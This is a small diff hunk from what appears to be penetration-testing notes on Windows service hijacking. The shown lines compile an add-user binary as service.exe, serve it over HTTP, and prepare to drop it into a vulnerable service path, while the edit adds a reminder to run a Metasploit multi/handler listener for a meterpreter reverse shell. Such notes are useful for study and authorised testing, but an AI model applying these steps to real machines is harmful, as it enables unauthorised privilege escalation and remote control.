@@ -54,7 +54,7 @@ x86_64-w64-mingw32-gcc adduser.c -o service.exe
 ```bash
 python -m http.server 80
 ```
-Remember to set up a listener if the service payload is a revshell!
+Remember to set up a listener (multi/handler for meterpreter) if the service payload is a revshell!
 
 Transfer file to target machine at the vulnerable service path:
 ```powershell
